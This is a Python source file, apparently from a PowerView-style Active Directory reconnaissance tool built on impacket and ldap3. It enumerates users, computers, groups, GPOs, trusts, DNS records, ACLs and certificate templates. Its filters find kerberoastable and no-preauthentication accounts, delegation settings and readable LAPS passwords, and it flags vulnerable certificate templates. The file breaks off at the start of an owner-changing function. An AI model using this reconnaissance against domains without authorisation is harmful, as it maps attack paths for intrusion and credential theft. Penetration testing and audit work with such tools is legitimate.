#!/usr/bin/env python3
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.ldap import ldaptypes

from powerview.modules.ca import CAEnum, PARSE_TEMPLATE
from powerview.modules.addcomputer import ADDCOMPUTER
from powerview.modules.kerberoast import GetUserSPNs
from powerview.utils.helpers import *
from powerview.utils.connections import CONNECTION
from powerview.modules.ldapattack import (
    LDAPAttack,
    ACLEnum,
    ADUser,
    ObjectOwner,
    RBCD
)
from powerview.utils.colors import bcolors
from powerview.utils.constants import (
    WELL_KNOWN_SIDS,
    KNOWN_SIDS,
)
from powerview.lib.dns import (
    DNS_RECORD,
    DNS_RPC_RECORD_A,
    DNS_UTIL,
)
from powerview.lib.resolver import (
    TRUST
)

import chardet
from io import BytesIO
import ldap3
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.extend.microsoft import addMembersToGroups, modifyPassword, removeMembersFromGroups
import logging
import re

class PowerView:
    def __init__(self, conn, args, target_server=None):
        self.conn = conn
        self.args = args
        self.username = args.username
        self.password = args.password
        self.domain = args.domain
        self.lmhash = args.lmhash
        self.nthash = args.nthash
        self.use_ldaps = args.use_ldaps
        self.dc_ip = args.dc_ip
        self.use_kerberos = args.use_kerberos

        self.ldap_server, self.ldap_session = self.conn.init_ldap_session()

        if self.ldap_session.server.ssl:
            self.use_ldaps = True

        cnf = ldapdomaindump.domainDumpConfig()
        cnf.basepath = None
        self.domain_dumper = ldapdomaindump.domainDumper(self.ldap_server, self.ldap_session, cnf)
        self.root_dn = self.domain_dumper.getRoot()
        self.fqdn = ".".join(self.root_dn.replace("DC=","").split(","))
        self.flatName = list_to_str(self.get_domain(properties=['name'])[0]['attributes']['name']).upper()

    def connection_alive(self):
        return not self.ldap_session.closed

    def reset_connection(self):
        self.ldap_session.bind()

    def get_domainuser(self, args=None, properties=[], identity=None):
        def_prop = [
            'servicePrincipalName',
            'objectCategory',
            'objectGUID',
            'primaryGroupID',
            'userAccountControl',
            'sAMAccountType',
            'adminCount',
            'cn',
            'name',
            'sAMAccountName',
            'distinguishedName',
            'mail',
            'description',
            'lastLogoff',
            'lastLogon',
            'memberof',
            'objectSid',
            'userPrincipalName',
            'pwdLastSet',
            'description',
            'badPwdCount',
            'badPasswordTime',
            'msDS-SupportedEncryptionTypes'
        ]

        properties = def_prop if not properties else properties
        identity = '*' if not identity else identity

        ldap_filter = ""
        identity_filter = f"(|(sAMAccountName={identity})(distinguishedName={identity}))"

        if args:
            if args.preauthnotrequired:
                logging.debug("[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate")
                ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            if args.passnotrequired:
                logging.debug("[Get-DomainUser] Searching for user accounts that have PASSWD_NOTREQD set")
                ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=32)'
            if args.admincount:
                logging.debug('[Get-DomainUser] Searching for adminCount=1')
                ldap_filter += f'(admincount=1)'
            if args.allowdelegation:
                logging.debug('[Get-DomainUser] Searching for users who can be delegated')
                ldap_filter += f'(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            if args.disallowdelegation:
                logging.debug('[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation')
                ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=1048576)'
            if args.trustedtoauth:
                logging.debug('[Get-DomainUser] Searching for users that are trusted to authenticate for other principals')
                ldap_filter += f'(msds-allowedtodelegateto=*)'
                properties += ['msds-AllowedToDelegateTo']
            if args.rbcd:
                logging.debug('[Get-DomainUser] Searching for users that are configured to allow resource-based constrained delegation')
                ldap_filter += f'(msds-allowedtoactonbehalfofotheridentity=*)'
            if args.spn:
                logging.debug("[Get-DomainUser] Searching for users that have SPN attribute set")
                ldap_filter += f'(servicePrincipalName=*)'
            if args.unconstrained:
                logging.debug("[Get-DomainUser] Searching for users configured for unconstrained delegation")
                ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            if args.ldapfilter:
                logging.debug(f'[Get-DomainUser] Using additional LDAP filter: {args.ldapfilter}')
                ldap_filter += f'{args.ldapfilter}'

        # previous ldap filter, need to changed to filter based on objectClass instead because i couldn't get the trust account
        #ldap_filter = f'(&(samAccountType=805306368){identity_filter}{ldap_filter})'
        ldap_filter = f'(&(objectCategory=person)(objectClass=user){identity_filter}{ldap_filter})'

        logging.debug(f'LDAP search filter: {ldap_filter}')

        # in case need more then 1000 entries
        entries = []
        entry_generator = self.ldap_session.extend.standard.paged_search(self.root_dn,ldap_filter,attributes=properties, paged_size = 1000, generator=True)
        for _entries in entry_generator:
            if _entries['type'] != 'searchResEntry':
                continue
            strip_entry(_entries)
            entries.append({"attributes":_entries["attributes"]})
        return entries
        #self.ldap_session.search(self.root_dn,ldap_filter,attributes=properties)
        #return self.ldap_session.entries

    def get_domaincontroller(self, args=None, properties=[], identity=None):
        def_prop = [
            'cn',
            'distinguishedName',
            'instanceType',
            'whenCreated',
            'whenChanged',
            'name',
            'objectGUID',
            'userAccountControl',
            'badPwdCount',
            'badPasswordTime',
            'objectSid',
            'logonCount',
            'sAMAccountType',
            'sAMAccountName',
            'operatingSystem',
            'dNSHostName',
            'objectCategory',
            'msDS-SupportedEncryptionTypes',
            'msDS-AllowedToActOnBehalfOfOtherIdentity'
        ]

        properties = def_prop if not properties else properties
        identity = '*' if not identity else identity

        ldap_filter = f'(userAccountControl:1.2.840.113556.1.4.803:=8192)'
        logging.debug(f'LDAP search filter: {ldap_filter}')
        entries = []
        entry_generator = self.ldap_session.extend.standard.paged_search(self.root_dn,ldap_filter,attributes=properties, paged_size = 1000, generator=True)
        for _entries in entry_generator:
            if _entries['type'] != 'searchResEntry':
                continue
            strip_entry(_entries)
            # resolve msDS-AllowedToActOnBehalfOfOtherIdentity
            try:
                if "msDS-AllowedToActOnBehalfOfOtherIdentity" in list(_entries["attributes"].keys()):
                    parser = RBCD(_entries)
                    sids = parser.read()
                    if args.resolvesids:
                        for i in range(len(sids)):
                            sids[i] = self.convertfrom_sid(sids[i])
                    _entries["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"] = sids
            except:
                pass

            entries.append({"attributes":_entries["attributes"]})

        return entries
        #self.ldap_session.search(self.root_dn,ldap_filter,attributes=properties)
        #return self.ldap_session.entries

    def get_domainobject(self, args=None, properties=['*'], identity='*', sd_flag=None):
        if sd_flag:
            # Set SD flags to only query for DACL and Owner
            controls = security_descriptor_control(sdflags=sd_flag)
        else:
            controls = None

        identity_filter = f"(|(samAccountName={identity})(name={identity})(displayname={identity})(objectSid={identity})(distinguishedName={identity})(dnshostname={identity}))"
        ldap_filter = f"(|{identity_filter})"
        if args:
            if args.ldapfilter:
                logging.debug(f'[Get-DomainObject] Using additional LDAP filter: {args.ldapfilter}')
                ldap_filter += f"{args.ldap_filter}"
        ldap_fiter = f"(&{ldap_filter})"
        logging.debug(f'LDAP search filter: {ldap_filter}')
        entries = []
        entry_generator = self.ldap_session.extend.standard.paged_search(self.root_dn,ldap_filter,attributes=properties, paged_size = 1000, generator=True, controls=controls)
        for _entries in entry_generator:
            if _entries['type'] != 'searchResEntry':
                continue
            strip_entry(_entries)
            entries.append({"attributes":_entries["attributes"]})
        return entries
        #self.ldap_session.search(self.root_dn,ldap_filter,attributes=properties)
        #return self.ldap_session.entries

    def get_domainobjectowner(self, identity=None, args=None):
        if not identity:
            identity = '*'
            logging.info("Recursing all domain objects. This might take a while")

        objects = self.get_domainobject(identity=identity, properties=[
            'cn',
            'nTSecurityDescriptor',
            'sAMAccountname',
            'ObjectSID',
            'distinguishedName',
        ], sd_flag=0x01)

        if len(objects) == 0:
            logging.error("Identity not found in domain")
            return

        for i in range(len(objects)):
            ownersid = None
            parser = ObjectOwner(objects[i])
            ownersid = parser.read()
            if args.resolvesid:
                ownersid = "%s (%s)" % (self.convertfrom_sid(ownersid), ownersid)
            objects[i] = modify_entry(
                objects[i],
                new_attributes = {
                    "Owner": ownersid
                },
                remove = [
                    'nTSecurityDescriptor'
                ]
            )
        return objects

    def get_domainou(self, args=None, properties=['*'], identity='*'):
        ldap_filter = ""
        if args:
            if args.gplink:
                ldap_filter += f"(gplink=*{args.gplink}*)"
            if args.ldapfilter:
                logging.debug(f'[Get-DomainOU] Using additional LDAP filter: {args.ldapfilter}')
                ldap_filter += f"{args.ldapfilter}"

        ldap_filter = f'(&(objectCategory=organizationalUnit)(|(name={identity})){ldap_filter})'
        logging.debug(f'LDAP search filter: {ldap_filter}')
        entries = []
        entry_generator = self.ldap_session.extend.standard.paged_search(self.root_dn,ldap_filter,attributes=properties, paged_size = 1000, generator=True)
        for _entries in entry_generator:
            if _entries['type'] != 'searchResEntry':
                continue
            strip_entry(_entries)
            entries.append({"attributes":_entries["attributes"]})
        return entries
        #self.ldap_session.search(self.root_dn,ldap_filter,attributes=properties)
        #return self.ldap_session.entries

    def get_domainobjectacl(self, args=None):
        #enumerate available guids
        guids_dict = {}
        self.ldap_session.search(f"CN=Extended-Rights,CN=Configuration,{self.root_dn}", "(rightsGuid=*)",attributes=['displayName','rightsGuid'])
        for entry in self.ldap_session.entries:
            guids_dict[entry['rightsGuid'].value] = entry['displayName'].value
        #self.ldap_session.search(f"CN=Schema,CN=Configuration,{self.root_dn}", "(schemaIdGuid=*)",attributes=['name','schemaIdGuid'])
        #for entry in self.ldap_session.entries:
        #    guids_dict[entry['schemaIdGuid'].values[0]] = entry['name'].values[0]
        setattr(args,"guids_map_dict",guids_dict)

        if args.security_identifier:
            principalsid_entry = self.get_domainobject(identity=args.security_identifier,properties=['objectSid'])
            if not principalsid_entry:
                logging.error(f'[Get-DomainObjectAcl] Principal {args.security_identifier} not found. Try to use DN')
                return
            elif len(principalsid_entry) > 1:
                logging.error(f'[Get-DomainObjectAcl] Multiple identities found. Use exact match')
                return
            args.security_identifier = principalsid_entry[0]['attributes']['objectSid']

        identity = args.identity
        if identity != "*":
            identity_entries = self.get_domainobject(identity=identity,properties=['objectSid','distinguishedName'])
            if len(identity_entries) == 0:
                logging.error(f'[Get-DomainObjectAcl] Identity {args.identity} not found. Try to use DN')
                return
            elif len(identity_entries) > 1:
                logging.error(f'[Get-DomainObjectAcl] Multiple identities found. Use exact match')
                return
            logging.debug(f'Target identity found in domain {"".join(identity_entries[0]["attributes"]["distinguishedName"])}')
            identity = "".join(identity_entries[0]['attributes']['distinguishedName'])
        else:
            logging.info('[Get-DomainObjectAcl] Recursing all domain objects. This might take a while')

        logging.debug(f"[Get-DomainObjectAcl] Searching for identity %s" % (identity))
        self.ldap_session.search(self.root_dn, f'(distinguishedName={identity})', attributes=['nTSecurityDescriptor','sAMAccountName','distinguishedName','objectSid'], controls=security_descriptor_control(sdflags=0x04))
        entries = self.ldap_session.entries

        if not entries:
            logging.error(f'[Get-DomainObjectAcl] Identity not found in domain')
            return

        enum = ACLEnum(entries, self.ldap_session, self.root_dn, args)
        entries_dacl = enum.read_dacl()
        return entries_dacl

    def get_domaincomputer(self, args=None, properties=[], identity=None, resolveip=False, resolvesids=False):
        def_prop = [
            'lastLogonTimestamp',
            'objectCategory',
            'servicePrincipalName',
            'dNSHostName',
            'sAMAccountType',
            'sAMAccountName',
            'logonCount',
            'objectSid',
            'primaryGroupID',
            'pwdLastSet',
            'lastLogon',
            'lastLogoff',
            'badPasswordTime',
            'badPwdCount',
            'userAccountControl',
            'objectGUID',
            'name',
            'instanceType',
            'distinguishedName',
            'cn',
            'operatingSystem',
            'msDS-SupportedEncryptionTypes'
        ]

        properties = def_prop if not properties else properties
        identity = '*' if not identity else identity

        ldap_filter = ""
        identity_filter = f"(|(name={identity})(sAMAccountName={identity})(dnsHostName={identity}))"

        if args:
            if args.unconstrained:
                logging.debug("[Get-DomainComputer] Searching for computers with for unconstrained delegation")
                ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            if args.trustedtoauth:
                logging.debug("[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals")
                ldap_filter += f'(msds-allowedtodelegateto=*)'
            if args.laps:
                logging.debug("[Get-DomainComputer] Searching for computers with LAPS enabled")
                ldap_filter += f'(ms-MCS-AdmPwd=*)'
                properties += ['ms-MCS-AdmPwd']
            if args.rbcd:
                logging.debug("[Get-DomainComputer] Searching for computers that are configured to allow resource-based constrained delegation")
                ldap_filter += f'(msds-allowedtoactonbehalfofotheridentity=*)'
                properties += ['msDS-AllowedToActOnBehalfOfOtherIdentity']
            if args.printers:
                logging.debug("[Get-DomainComputer] Searching for printers")
                ldap_filter += f'(objectCategory=printQueue)'
            if args.spn:
                logging.debug(f"[Get-DomainComputer] Searching for computers with SPN attribute: {args.spn}")
                ldap_filter += f'(servicePrincipalName=*)'
            if args.excludedcs:
                logging.debug("[Get-DomainComputer] Excluding domain controllers")
                ldap_filter += f'(!(userAccountControl:1.2.840.113556.1.4.803:=8192))'
            if args.ldapfilter:
                logging.debug(f'[Get-DomainComputer] Using additional LDAP filter: {args.ldapfilter}')
                ldap_filter += f"{args.ldapfilter}"

        # also need to change this to filter from objectClass instead
        #ldap_filter = f'(&(samAccountType=805306369){identity_filter}{ldap_filter})'
        ldap_filter = f'(&(objectClass=computer){identity_filter}{ldap_filter})'
        logging.debug(f'LDAP search filter: {ldap_filter}')
        entries = []
        entry_generator = self.ldap_session.extend.standard.paged_search(self.root_dn,ldap_filter,attributes=properties, paged_size = 1000, generator=True)
        for _entries in entry_generator:
            if _entries['type'] != 'searchResEntry':
                continue
            strip_entry(_entries)
            #if (_entries['attributes']['dnsHostName'], list):
            #    dnshostname = _entries['attributes']['dnsHostName'][0]
            #else:
            #    dnshostname = _entries['attributes']['dnsHostName']
            #if not dnshostname:
            #    continue
            if resolveip and _entries['attributes']['dnsHostName']:
                ip = host2ip(_entries['attributes']['dnsHostName'], self.dc_ip, 3, True)
                if ip:
                    _entries = modify_entry(
                        _entries,
                        new_attributes = {
                            'IPAddress':ip
                        }
                    )
            # resolve msDS-AllowedToActOnBehalfOfOtherIdentity
            try:
                if "msDS-AllowedToActOnBehalfOfOtherIdentity" in list(_entries["attributes"].keys()):
                    parser = RBCD(_entries)
                    sids = parser.read()
                    if args.resolvesids:
                        for i in range(len(sids)):
                            sids[i] = self.convertfrom_sid(sids[i])
                    _entries["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"] = sids
            except:
                pass

            entries.append({"attributes":_entries["attributes"]})
        return entries
        #self.ldap_session.search(self.root_dn,ldap_filter,attributes=properties)
        #return self.ldap_session.entries

    def get_domaingroup(self, args=None, properties=[], identity=None):
        def_prop = [
            'adminCount',
            'cn',
            'description',
            'distinguishedName',
            'groupType',
            'instanceType',
            'member',
            'objectCategory',
            'objectGUID',
            'objectSid',
            'sAMAccountName',
            'sAMAccountType',
            'name'
        ]

        properties = def_prop if not properties else properties
        identity = '*' if not identity else identity

        ldap_filter = ""
        identity_filter = f"(|(|(samAccountName={identity})(name={identity})(distinguishedName={identity})))"
        if args:
            if args.admincount:
                ldap_filter += f"(admincount=1)"
            if args.ldapfilter:
                ldap_filter += f"{args.ldapfilter}"
                logging.debug(f'[Get-DomainGroup] Using additional LDAP filter: {args.ldapfilter}')
            if args.memberidentity:
                entries = self.get_domainobject(identity=args.memberidentity)
                if len(entries) == 0:
                    logging.info("Member identity not found. Try to use DN")
                    return
                memberidentity_dn = entries[0]['attributes']['distinguishedName']
                ldap_filter += f"(member={memberidentity_dn})"
                logging.debug(f'[Get-DomainGroup] Filter is based on member property {ldap_filter}')

        ldap_filter = f'(&(objectCategory=group){identity_filter}{ldap_filter})'
        logging.debug(f'LDAP search filter: {ldap_filter}')
        entries = []
        entry_generator = self.ldap_session.extend.standard.paged_search(self.root_dn,ldap_filter,attributes=properties, paged_size = 1000, generator=True)
        for _entries in entry_generator:
            if _entries['type'] != 'searchResEntry':
                continue
            strip_entry(_entries)
            entries.append({"attributes":_entries["attributes"]})
        return entries
        #self.ldap_session.search(self.root_dn,ldap_filter,attributes=properties)
        #return self.ldap_session.entries

    def get_domaingroupmember(self, args=None, identity='*'):
        # get the identity group information
        entries = self.get_domaingroup(identity=identity)
        if len(entries) == 0:
            logging.info("No group found")
            return

        if len(entries) > 1:
            logging.info("Multiple group found. Probably try searching with distinguishedName")
            return

        group_identity_sam = entries[0]['attributes']['sAMAccountName']
        group_identity_dn = entries[0]['attributes']['distinguishedName']

        ldap_filter = f"(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:={group_identity_dn}))"
        self.ldap_session.search(self.root_dn, ldap_filter, attributes='*')

        # create a new entry structure
        new_entries = []
        for entry in self.ldap_session.entries:
            attr = {}
            member_infos = {}
            try:
                member_infos['GroupDomainName'] = group_identity_sam
            except:
                pass
            try:
                member_infos['GroupDistinguishedName'] = group_identity_dn
            except:
                pass
            try:
                member_infos['MemberDomain'] = entry['userPrincipalName'].value.split("@")[-1]
            except:
                member_infos['MemberDomain'] = self.domain
            try:
                member_infos['MemberName'] = entry['sAMAccountName'].value
            except:
                pass
            try:
                member_infos['MemberDistinguishedName'] = entry['distinguishedName'].value
            except:
                pass
            try:
                member_infos['MemberSID'] = entry['objectSid'].value
            except:
                pass

            attr['attributes'] = member_infos
            new_entries.append(attr.copy())

        return new_entries

    def get_domaingpo(self, args=None, properties=['*'], identity='*'):
        ldap_filter = ""
        identity_filter = f"(cn={identity})"
        if args:
            if args.ldapfilter:
                logging.debug(f'[Get-DomainGPO] Using additional LDAP filter: {args.ldapfilter}')
                ldap_filter += f"{args.ldapfilter}"

        ldap_filter = f'(&(objectCategory=groupPolicyContainer){identity_filter}{ldap_filter})'
        logging.debug(f'LDAP search filter: {ldap_filter}')
        entries = []
        entry_generator = self.ldap_session.extend.standard.paged_search(self.root_dn,ldap_filter,attributes=properties, paged_size = 1000, generator=True)
        for _entries in entry_generator:
            if _entries['type'] != 'searchResEntry':
                continue
            strip_entry(_entries)
            entries.append({"attributes":_entries["attributes"]})
        return entries
        #self.ldap_session.search(self.root_dn,ldap_filter,attributes=properties)
        #return self.ldap_session.entries

    def get_domaingpolocalgroup(self, args=None, identity='*'):
        new_entries = []
        entries = self.get_domaingpo(identity=identity)
        if len(entries) == 0:
            logging.error("No GPO object found")
            return
        for entry in entries:
            new_dict = {}
            try:
                gpcfilesyspath = f"{entry['attributes']['gPCFileSysPath']}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
                if self.use_kerberos:
                    conn = self.conn.init_smb_session(self.kdcHost)
                else:
                    conn = self.conn.init_smb_session(self.dc_ip)
                share = 'sysvol'
                filepath = ''.join(gpcfilesyspath.lower().split(share)[1:])

                fh = BytesIO()
                try:
                    conn.getFile(share, filepath, fh.write)
                except:
                    pass
                output = fh.getvalue()
                encoding = chardet.detect(output)["encoding"]
                error_msg = "[-] Output cannot be correctly decoded, are you sure the text is readable ?"
                if encoding:
                    data_content = output.decode(encoding)
                    found, infobject = parse_inicontent(filecontent=data_content)
                    if found:
                        #for i in infobject: # i = dict
                        #    new_dict['attributes'] = {'GPODisplayName': entry['displayName'].values[0],'GroupSID':i['sid'],'GroupMemberOf': i['memberof'], 'GroupMembers': i['memberof']}

                        if len(infobject) == 2:
                            new_dict['attributes'] = {'GPODisplayName': entry['attributes']['displayName'], 'GPOName': entry['attributes']['name'], 'GPOPath': entry['attributes']['gPCFileSysPath'], 'GroupName': self.convertfrom_sid(infobject[0]['sids']),'GroupSID':infobject[0]['sids'],'GroupMemberOf': f"{infobject[0]['memberof']}" if infobject[0]['memberof'] else "{}", 'GroupMembers': f"{infobject[1]['members']}" if infobject[1]['members'] else "{}"}
                            new_entries.append(new_dict.copy())
                        else:
                            for i in range(0,len(infobject),2):
                                new_dict['attributes'] = {'GPODisplayName': entry['attributes']['displayName'], 'GPOName': entry['attributes']['name'], 'GPOPath': entry['attributes']['gPCFileSysPath'], 'GroupName':self.convertfrom_sid(infobject[0]['sids']) ,'GroupSID':infobject[i]['sids'],'GroupMemberOf': f"{infobject[i]['memberof']}" if infobject[i]['memberof'] else "{}", 'GroupMembers': f"{infobject[i+1]['members']}" if infobject[i+1]['members'] else "{}"}
                                new_entries.append(new_dict.copy())
                    fh.close()
                else:
                    fh.close()
                    continue

            except ldap3.core.exceptions.LDAPKeyError as e:
                pass
        return new_entries

    def get_domaintrust(self, args=None, properties=[], identity=None):
        def_prop = [
            'name',
            'objectGUID',
            'securityIdentifier',
            'trustDirection',
            'trustPartner',
            'trustType',
            'trustAttributes',
            'flatName'
        ]

        properties = def_prop if not properties else properties
        identity = '*' if not identity else identity

        identity_filter = f"(name={identity})"
        ldap_filter = f'(&(objectClass=trustedDomain){identity_filter})'
        logging.debug(f'LDAP search filter: {ldap_filter}')

        entries = []
        entry_generator = self.ldap_session.extend.standard.paged_search(self.root_dn,ldap_filter,attributes=properties, paged_size = 1000, generator=True)
        for _entries in entry_generator:
            if _entries['type'] != 'searchResEntry':
                continue
            strip_entry(_entries)
            # resolve trustattributes
            try:
                if "trustAttributes" in list(_entries["attributes"].keys()):
                    _entries["attributes"]["trustAttributes"] = TRUST.resolve_trustAttributes(_entries["attributes"]["trustAttributes"])
            except KeyError:
                pass
            except TypeError:
                pass

            # resolve trustType
            try:
                if "trustType" in list(_entries["attributes"].keys()):
                    _entries["attributes"]["trustType"] = TRUST.resolve_trustType(_entries["attributes"]["trustType"])
            except KeyError:
                pass
            except TypeError:
                pass

            # resolve trustDirection
            try:
                if "trustDirection" in list(_entries["attributes"].keys()):
                    _entries["attributes"]["trustDirection"] = TRUST.resolve_trustDirection(_entries["attributes"]["trustDirection"])
            except KeyError:
                pass
            except TypeError:
                pass

            entries.append({"attributes":_entries["attributes"]})
        return entries
        #self.ldap_session.search(self.root_dn,ldap_filter,attributes=properties)
        #return self.ldap_session.entries

    def convertfrom_sid(self, objectsid, args=None, output=False):
        identity = WELL_KNOWN_SIDS.get(objectsid)
        known_sid = KNOWN_SIDS.get(objectsid)
        if identity:
            identity = f"{self.flatName}\\{identity}"
        elif known_sid:
            identity = known_sid
        else:
            ldap_filter = f"(|(|(objectSid={objectsid})))"
            logging.debug(f"[ConvertFrom-SID] LDAP search filter: {ldap_filter}")

            self.ldap_session.search(self.root_dn,ldap_filter,attributes=['sAMAccountName','name'])
            if len(self.ldap_session.entries) != 0:
                try:
                    identity = f"{self.flatName}\\{self.ldap_session.entries[0]['sAMAccountName'].value}"
                except IndexError:
                    identity = f"{self.flatName}\\{self.ldap_session.entries[0]['name'].value}"

                KNOWN_SIDS[objectsid] = identity
            else:
                logging.debug(f"No objects found for {objectsid}")
                return objectsid
        if output:
            print("%s\n" % identity)
        return identity

    def get_domain(self, args=None, properties=['*'], identity='*'):
        ldap_filter = f'(objectClass=domain)'
        logging.debug(f'[Get-Domain] LDAP search filter: {ldap_filter}')
        entries = []
        entry_generator = self.ldap_session.extend.standard.paged_search(self.root_dn,ldap_filter,attributes=properties, paged_size = 1000, generator=True)
        for _entries in entry_generator:
            if _entries['type'] != 'searchResEntry':
                continue
            strip_entry(_entries)
            entries.append({"attributes":_entries["attributes"]})
        return entries
        #self.ldap_session.search(self.root_dn,ldap_filter,attributes=properties)
        #return self.ldap_session.entries

    def get_domaindnszone(self, identity=None, properties=[], args=None):
        def_prop = [
            'objectClass',
            'cn',
            'distinguishedName',
            'instanceType',
            'whenCreated',
            'whenChanged',
            'name',
            'objectGUID',
            'objectCategory',
            'dSCorePropagationData',
            'dc'
        ]

        properties = def_prop if not properties else properties
        identity = '*' if not identity else identity

        identity_filter = f"(name={identity})"
        ldap_filter = f"(&(objectClass=dnsZone){identity_filter})"
        search_base = f"CN=MicrosoftDNS,DC=DomainDnsZones,{self.root_dn}"

        logging.debug(f"[Get-DomainDNSZone] LDAP filter string: {ldap_filter}")

        entries = []
        entry_generator = self.ldap_session.extend.standard.paged_search(search_base,ldap_filter,attributes=properties,paged_size = 1000,generator=True)
        for _entries in entry_generator:
            if _entries['type'] != 'searchResEntry':
                continue
            strip_entry(_entries)
            entries.append({"attributes":_entries["attributes"]})
        return entries
        #self.ldap_session.search(search_base, ldap_filter, attributes=properties)
        #return self.ldap_session.entries

    def get_domaindnsrecord(self, identity=None, zonename=None, properties=[], args=None):
        def_prop = [
            'name',
            'distinguishedName',
            'dnsrecord',
            'whenCreated',
            'uSNChanged',
            'objectCategory',
            'objectGUID'
        ]

        zonename = '*' if not zonename else zonename
        identity = '*' if not identity else identity
        properties = def_prop if not properties else properties

        zones = self.get_domaindnszone(identity=zonename, properties=['distinguishedName'])
        entries = []
        identity_filter = f"(|(name={identity})(distinguishedName={identity}))"
        ldap_filter = f'(&(objectClass=dnsNode){identity_filter})'
        for zone in zones:
            logging.debug(f"[Get-DomainDNSRecord] Search base: {zone['attributes']['distinguishedName']}")

            entry_generator = self.ldap_session.extend.standard.paged_search(zone['attributes']['distinguishedName'],ldap_filter,attributes=properties, paged_size = 1000, generator=True)
            for _entries in entry_generator:
                if _entries['type'] != 'searchResEntry':
                    continue
                strip_entry(_entries)
                for record in _entries['attributes']['dnsRecord']:
                    if not isinstance(record, bytes):
                        record = record.encode()
                    dr = DNS_RECORD(record)
                    _entries = modify_entry(_entries,new_attributes={
                        'TTL': dr['TtlSeconds'],
                        'TimeStamp': dr['TimeStamp'],
                        'UpdatedAtSerial': dr['Serial'],
                    })
                    parsed_data = DNS_UTIL.parse_record_data(dr)
                    if parsed_data:
                        for data in parsed_data:
                            _entries = modify_entry(_entries,new_attributes={
                                data : parsed_data[data]
                            })
                        entries.append({"attributes":_entries["attributes"]})
        return entries

    def get_domainca(self, args=None, properties=['*']):
        ca_fetch = CAEnum(self.ldap_session, self.root_dn)
        entries = ca_fetch.fetch_enrollment_services(properties)
        return entries

    def get_domaincatemplate(self, args=None, properties=[], identity=None):
        def_prop = [
            "cn",
            "name",
            "displayName",
            "pKIExpirationPeriod",
            "pKIOverlapPeriod",
            "msPKI-Enrollment-Flag",
            "msPKI-Private-Key-Flag",
            "msPKI-Certificate-Name-Flag",
            "msPKI-RA-Signature",
            "pKIExtendedKeyUsage",
            "nTSecurityDescriptor",
            "objectGUID",
        ]

        identity = '*' if not identity else identity

        entries = []
        template_guids = []
        ca_fetch = CAEnum(self.ldap_session, self.root_dn)

        templates = ca_fetch.get_certificate_templates(def_prop,identity)
        cas = ca_fetch.fetch_enrollment_services()

        if len(cas) <= 0:
            logging.error(f"No certificate authority found")
            return

        logging.debug(f"Found {len(cas)} CA(s)")
        for ca in cas:
            for template in templates:
                #template = template.entry_writable()
                enabled = False
                vulnerable = False
                vulns = {}

                # avoid dupes
                if template["objectGUID"] in template_guids:
                    continue
                else:
                    template_guids.append(template["objectGUID"])

                # get enrollment rights
                template_ops = PARSE_TEMPLATE(template)
                parsed_dacl = template_ops.parse_dacl()
                template_ops.resolve_flags()
                template_owner = template_ops.get_owner_sid()
                certificate_name_flag = template_ops.get_certificate_name_flag()
                enrollment_flag = template_ops.get_enrollment_flag()
                extended_key_usage = template_ops.get_extended_key_usage()
                validity_period = template_ops.get_validity_period()
                renewal_period = template_ops.get_renewal_period()

                try:
                    ca_templates = ca.certificateTemplates

                    if ca_templates is None:
                        ca_templates = []
                except ldap3.core.exceptions.LDAPCursorAttributeError:
                    ca_templates = []

                if template.name in ca_templates:
                    enabled = True

                if args.enabled and not enabled:
                    continue

                # check vulnerable
                if args.vulnerable:
                    vulns = template_ops.check_vulnerable_template()
                    if vulns:
                        vulnerable = True
                    else:
                        continue

                if args.resolve_sids:
                    template_owner = self.convertfrom_sid(template_ops.get_owner_sid())

                    for i in range(len(parsed_dacl['Enrollment Rights'])):
                        try:
                            parsed_dacl['Enrollment Rights'][i] = self.convertfrom_sid(parsed_dacl['Enrollment Rights'][i])
                        except:
                            pass

                    for k in range(len(parsed_dacl['Write Owner'])):
                        try:
                            parsed_dacl['Write Owner'][k] = self.convertfrom_sid(parsed_dacl['Write Owner'][k])
                        except:
                            pass

                    for j in range(len(parsed_dacl['Write Dacl'])):
                        try:
                            parsed_dacl['Write Dacl'][j] = self.convertfrom_sid(parsed_dacl['Write Dacl'][j])
                        except:
                            pass

                    for y in range(len(parsed_dacl['Write Property'])):
                        try:
                            parsed_dacl['Write Property'][y] = self.convertfrom_sid(parsed_dacl['Write Property'][y])
                        except:
                            pass

                e = modify_entry(template,
                                 new_attributes={
                                    'Owner': template_owner,
                                    'Certificate Authorities': ca.name,
                                    'msPKI-Certificate-Name-Flag': certificate_name_flag,
                                    'msPKI-Enrollment-Flag': enrollment_flag,
                                    'pKIExtendedKeyUsage': extended_key_usage,
                                    'pKIExpirationPeriod': validity_period,
                                    'pKIOverlapPeriod': renewal_period,
                                    'Enrollment Rights': parsed_dacl['Enrollment Rights'],
                                    'Extended Rights': parsed_dacl['Extended Rights'],
                                    'Write Owner': parsed_dacl['Write Owner'],
                                    'Write Dacl': parsed_dacl['Write Dacl'],
                                    'Write Property': parsed_dacl['Write Property'],
                                    'Enabled': enabled,
                                    'Vulnerable': list(vulns.keys()),
                                    #'Description': vulns['ESC1']
                                },
                                 remove = [
                                     'nTSecurityDescriptor',
                                     'msPKI-Certificate-Name-Flag',
                                     'msPKI-Enrollment-Flag',
                                     'pKIExpirationPeriod',
                                     'pKIOverlapPeriod',
                                     'pKIExtendedKeyUsage'
                                 ]

                                 )
                new_dict = {}
                if properties:
                    ori_list = list(e["attributes"].keys())
                    for p in properties:
                        if p.lower() not in [x.lower() for x in ori_list]:
                            logging.error("Invalid atribute type %s" % (p))
                            return
                        for i in ori_list:
                            if p.casefold() == i.casefold():
                                new_dict[i] = e["attributes"][i]
                else:
                    new_dict = e["attributes"]

                entries.append({
                    "attributes": new_dict
                })
        template_guids.clear()
        return entries

    def set_domainobjectowner(self, targetidentity, principalidentity, args=None):
        # verify that the targetidentity exists
